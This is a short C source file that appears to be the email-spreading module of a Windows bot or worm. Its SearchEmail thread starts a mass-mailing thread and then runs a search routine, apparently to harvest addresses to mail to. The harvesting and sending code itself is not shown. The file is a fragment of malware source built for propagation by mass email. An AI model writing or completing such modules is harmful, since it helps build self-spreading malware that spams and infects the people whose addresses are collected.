#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_EMAIL

DWORD WINAPI SearchEmail(LPVOID param) {
	int threadnum = (int)param;
	HANDLE tHandle;
	DWORD tid;

	MassMailInit();
	tHandle = CreateThread(NULL, 0, &MassMailThread, NULL, 0, &tid);
	if (!tHandle) return (EXIT_FAILURE);

	SearchInit();
	Search(); /*(orbitz) that's why we have concurrency*/

	clearthread(threadnum);
	ExitThread(EXIT_SUCCESS);
}

#endif